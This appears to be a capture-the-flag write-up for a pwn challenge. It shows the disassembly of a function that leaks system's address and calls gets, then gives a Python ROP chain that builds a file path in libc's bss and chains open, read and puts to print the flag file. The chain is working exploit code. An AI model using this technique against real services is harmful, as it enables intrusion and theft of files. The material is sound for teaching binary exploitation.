# no_handouts

This challenge provided no source code, but it did provide a binary `chall`.

Disassembling it, I saw that the `main` function called `vuln`, which is as follows:

```asm
<vuln>:
endbr64
push   %rbp
mov    %rsp,%rbp
sub    $0x20,%rsp
lea    0xe05(%rip),%rax    ; "system() only works if there's a shell in the first place!"
mov    %rax,%rdi
call   puts
mov    0x2dce(%rip),%rax   ; system
mov    %rax,%rsi
lea    0xe2c(%rip),%rax    ; "Don't believe me? Try it yourself: it's at %p"
mov    %rax,%rdi
mov    $0x0,%eax
call   printf
lea    0xe48(%rip),%rax    ; "Surely that's not enough information to do anything else."
mov    %rax,%rdi
call   puts
lea    -0x20(%rbp),%rax
mov    %rax,%rdi
mov    $0x0,%eax
call   gets
mov    $0x0,%eax
leave
ret
```

So this just says where `system` is, and then calls `gets` to provide a free buffer overflow.
It's also given that the flag is located at `/app/flag.txt`

Using the provided location of `system`, we know where `libc` is located. Thanks to this, we can open() the flag, read() its contents, and then puts() the result.

Here's the ROP chain that worked for me:

```python
start_addr = elf_libc.bss() # readable/writable section. We can use this as a buffer
filename = start_addr + 0x00
flag = start_addr + 0x20

flag_length = 50 # INCREASE IF NOT SUFFICIENT
rop_chain = [

             # build "/app/flag.txt" string
             pop_rax, libc + filename,
             pop_rdx_r12, 0x616C662F7070612F, 0, # /app/fla
             mov_at_rax_rdx,  # this gadget is mov qword ptr [rax], rdx ; ret
             pop_rax, libc + filename + 8,
             pop_rdx_r12, 0x7478742E67, 0,       # g.txt
             mov_at_rax_rdx,

             # open file
             pop_rdi, libc + filename,
             pop_rsi, 0,
             pop_rdx_r12, 0, 0,
             open_c,

             # read file
             pop_rdi, 3, # guess at fd, (first fd after STDIN, STDOUT, and STDERR)
             pop_rsi, libc + flag,
             pop_rdx_r12, flag_length, 0,
             read,

             # write value
             pop_rdi, libc + flag,
             puts,
            ]
```

After injecting that, I got this output: `bctf{sh3lls_ar3_bl0at_ju5t_use_sh3llcode!}`
As this flag says, this is not the only way this could've been solved.



